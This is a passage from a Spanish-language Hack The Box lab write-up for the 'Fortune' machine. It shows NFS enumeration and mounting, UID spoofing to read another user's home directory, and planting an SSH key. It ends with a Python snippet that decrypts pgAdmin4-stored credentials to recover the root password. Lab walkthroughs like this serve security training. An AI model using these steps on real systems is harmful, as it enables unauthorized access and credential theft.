&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/fortune# rpcinfo -p 10.10.10.127
   program vers proto   port  service
    &lt;span class=&#34;m&#34;&gt;100000&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;   tcp    &lt;span class=&#34;m&#34;&gt;111&lt;/span&gt;  portmapper
    &lt;span class=&#34;m&#34;&gt;100000&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;   udp    &lt;span class=&#34;m&#34;&gt;111&lt;/span&gt;  portmapper
    &lt;span class=&#34;m&#34;&gt;100005&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;   udp    &lt;span class=&#34;m&#34;&gt;694&lt;/span&gt;  mountd
    &lt;span class=&#34;m&#34;&gt;100005&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;   udp    &lt;span class=&#34;m&#34;&gt;694&lt;/span&gt;  mountd
    &lt;span class=&#34;m&#34;&gt;100005&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;   tcp    &lt;span class=&#34;m&#34;&gt;944&lt;/span&gt;  mountd
    &lt;span class=&#34;m&#34;&gt;100005&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;   tcp    &lt;span class=&#34;m&#34;&gt;944&lt;/span&gt;  mountd
    &lt;span class=&#34;m&#34;&gt;100003&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;   udp   &lt;span class=&#34;m&#34;&gt;2049&lt;/span&gt;  nfs
    &lt;span class=&#34;m&#34;&gt;100003&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;   udp   &lt;span class=&#34;m&#34;&gt;2049&lt;/span&gt;  nfs
    &lt;span class=&#34;m&#34;&gt;100003&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;   tcp   &lt;span class=&#34;m&#34;&gt;2049&lt;/span&gt;  nfs
    &lt;span class=&#34;m&#34;&gt;100003&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;   tcp   &lt;span class=&#34;m&#34;&gt;2049&lt;/span&gt;  nfs
root@sckull:~/htb/fortune# 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;nfs&#34;&gt;NFS&lt;/h2&gt;
&lt;p&gt;Al revisar los puntos compartidos obtenemos que &lt;code&gt;/home&lt;/code&gt; puede ser montado&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/fortune# showmount -e 10.10.10.127
Export list &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.127:
/home &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;everyone&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
root@sckull:~/htb/fortune# 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;acceso-a-home&#34;&gt;ACCESO a /home&lt;/h3&gt;
&lt;p&gt;Para acceder a la carpeta &lt;code&gt;/home&lt;/code&gt; debemos montarlo localmente y asi poder acceder a las carpetas y archivos que se encuentran dentro.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;root@sckull:~/htb/fortune# mkdir tmp_nfs
root@sckull:~/htb/fortune# mount -t nfs 10.10.10.127:/home /root/htb/fortune/tmp_nfs
root@sckull:~/htb/fortune# ls tmp_nfs/
bob  charlie  nfsuser
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Observamos que hay tres usuarios de los cuales bob ya conocemos su interior, mas no el de charlie y &lt;strong&gt;nfsuser:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/fortune# ls -lah tmp_nfs/nfsuser/
total 16K
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;512&lt;/span&gt; Nov  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; 02:39 .
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; root root &lt;span class=&#34;m&#34;&gt;512&lt;/span&gt; Nov  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; 01:19 ..
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;771&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 20:18 .cshrc
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;101&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 20:18 .cvsrc
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;359&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 20:18 .login
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;175&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 20:18 .mailrc
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;215&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 20:18 .profile
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;87&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; 20:18 .Xdefaults
root@sckull:~/htb/fortune# ls -lah tmp_nfs/charlie/
ls: cannot open directory &lt;span class=&#34;s1&#34;&gt;&amp;#39;tmp_nfs/charlie/&amp;#39;&lt;/span&gt;: Permission denied
root@sckull:~/htb/fortune# 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Podemos ver que a la carpeta del usuario charlie no tenemos acceso, para ello vamos a crear un usuario localmente y un grupo para poder acceder al interior, utilizamos stat para ver informacion de la carpeta, con lo cual vemos que &lt;code&gt;/home/charlie&lt;/code&gt; tiene propiedades &lt;code&gt;uid: 1000 y gid:1000&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/fortune# stat tmp_nfs/charlie/
  File: tmp_nfs/charlie/
  Size: &lt;span class=&#34;m&#34;&gt;512&lt;/span&gt;       	Blocks: &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;          IO Block: &lt;span class=&#34;m&#34;&gt;32768&lt;/span&gt;  directory
Device: 31h/49d	Inode: &lt;span class=&#34;m&#34;&gt;27648&lt;/span&gt;       Links: &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;
Access: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0750/drwxr-x---&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  Uid: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; 1000/ UNKNOWN&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;   Gid: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; 1000/ UNKNOWN&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Access: 2019-03-21 05:17:35.827314870 +0000
Modify: 2019-03-21 05:33:05.655948328 +0000
Change: 2019-03-21 05:33:05.655948328 +0000
 Birth: -
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Creamos un usuario y grupo local para charlie:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~# groupadd --gid &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; charlie_group
root@kali:~# useradd --uid &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; --groups charlie_group charlie_user
root@kali:~# sudo -u charlie_user ls -l tmp_nfs/charlie
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Con ello logramos acceder y obtener tambien nuestra bandera &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-20%2023-43-48.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-20%2023-45-14.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ahora que tenemos acceso a la carpeta de charlie podemos agregar nuestra clave ssh a &lt;code&gt;authorized_keys&lt;/code&gt; para poder logearnos con el servicio ssh como charlie.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-20%2023-55-26.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;De la misma forma para el usuario bob:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-21%2000-50-59.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;escalacion-de-privilegios&#34;&gt;ESCALACION DE PRIVILEGIOS&lt;/h2&gt;
&lt;p&gt;Dentro de la carpeta charlie nos encontramos con un archivo &lt;code&gt;mbox&lt;/code&gt;, que contiene un mensaje de bob para charlie.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-20%2023-58-14.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nos dice que bob cambio la contraseña para el usuario dba es la misma que la del usuario root, haciendo una enumeracion de carpetas y archivos nos encontramos un archivo &lt;code&gt;pgadmin4.db&lt;/code&gt; que contiene tablas que le pertenecen a &lt;code&gt;pgadmin3.4&lt;/code&gt;, utilizando sqlite db browser, dentro de este archivo encontramos una contraseña y usuario &lt;code&gt;dba&lt;/code&gt; especificamente en la tabla de &lt;code&gt;server&lt;/code&gt;, tambien una tabla que contiene usuario y contraseña de bob y charlie.&lt;/p&gt;
&lt;p&gt;Ruta del archivo:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;/var/appsrv/pgadmin4/pgadmin4.db
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-22%2017-13-19.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Tambien encontramos la ruta donde se encuentran los documentos de pgadmin dentro del archivo &lt;code&gt;pgadmin4.ini&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-22%2017-14-06.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;dba&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-22%2016-56-18.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;bob y charlie&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-22%2016-58-51.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;usuario-root&#34;&gt;Usuario ROOT&lt;/h3&gt;
&lt;p&gt;En la ruta de pgadmin4 local (&lt;code&gt;/usr/local/pgadmin4/pgadmin4-3.4/web/utils/)&lt;/code&gt;, encontramos un archivo llamado crypto.py, en su interior encontramos funciones las cuales encriptan y desencriptan contraseñas (&lt;code&gt;encrypt(), decrypt(), pad(), pqencryptpassword()&lt;/code&gt;), la funcion de &lt;code&gt;encrypt()&lt;/code&gt; necesita un texto y una clave, la funcion &lt;code&gt;decrypt()&lt;/code&gt; el texto encriptado (&lt;code&gt;ciphertext&lt;/code&gt;) anteriormente con la funcion &lt;code&gt;encrypt()&lt;/code&gt; y la clave, con estas dos funciones y la contraseña que se encuentra en la tabla de server del usuario &lt;code&gt;dba&lt;/code&gt;, podemos intentar desencriptarla solo nos falta la clave (key).&lt;/p&gt;
&lt;p&gt;Dentro de la base de datos (pgadmin4.db) encontramos algunas claves (tabla -&amp;gt; keys) que podriamos utilizar para la funcion decrypt(), de igual forma los usuarios (tabla -&amp;gt; users) y contraseñas (tabla -&amp;gt; users).&lt;/p&gt;
&lt;p&gt;Localmente agregamos el siguiente codigo a nuestro archivo crypto.py:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;__name__&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;

    &lt;span class=&#34;n&#34;&gt;list_keys&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;root&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;operator&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;www&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;postgresql&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pgadmin4&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;fortune&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;charlie&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
                  &lt;span class=&#34;s1&#34;&gt;&amp;#39;bob&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;nfsuser&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;authpf&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;administrator&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pgadmin3&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Administrator&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;bob@fortune.htb&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
                  &lt;span class=&#34;s1&#34;&gt;&amp;#39;charlie@fortune.htb&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;saQWKx5BCyVZMH2weOiNv3Dsvzh4GchPM16kwBRYPxs=&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
                  &lt;span class=&#34;s1&#34;&gt;&amp;#39;R_EFY1hb236guS3jNq1aHyPcruXbjk7Ff-QwL6PMqJM=&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;qIhAhRt3xq_dzIEqyJQFmWnymFbO1cZVhbQaTWA-v9Q=&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
                  &lt;span class=&#34;s1&#34;&gt;&amp;#39;dba&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;postgres&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;$pbkdf2-sha512$25000$3hvjXAshJKQUYgxhbA0BYA$iuBYZKTTtTO.cwSvMwPAYlhXRZw8aAn9gBtyNQW3Vge23gNUMe95KqiAyf37.v1lmCunWVkmfr93Wi6.W.UzaQ&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
                  &lt;span class=&#34;s1&#34;&gt;&amp;#39;$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
    
    &lt;span class=&#34;n&#34;&gt;pass_dba&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz&amp;#34;&lt;/span&gt;
    
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;list_keys&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;k&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;decrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pass_dba&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;k&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; : &amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Esta porcion de codigo contiene una lista de las claves (keys) probables para la contraseña (&lt;code&gt;pass_dba&lt;/code&gt;) del usuario dba que corresponde igualmente para el usuario root, dentro de las claves tambien encontramos usuarios, ya que una key podria ser o no el nombre de un usuario, de igual manera agregamos las contraseñas de la base de datos de los usuarios bob y charlie. En resumen agregamos a la lista todas las posibles claves que encontramos dentro de la maquina. Al correr nuestro script obtenemos el siguente resultado:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-22%2017-39-55.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nuestra contraseña para el usuario dba y para root es &lt;code&gt;R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!&lt;/code&gt;, la clave que fue satisfactoria fue una contraseña en este caso la contraseña de bob que se encuentra en la base de datos. Asi obtenemos nuestra bandera &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-22%2017-42-14.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
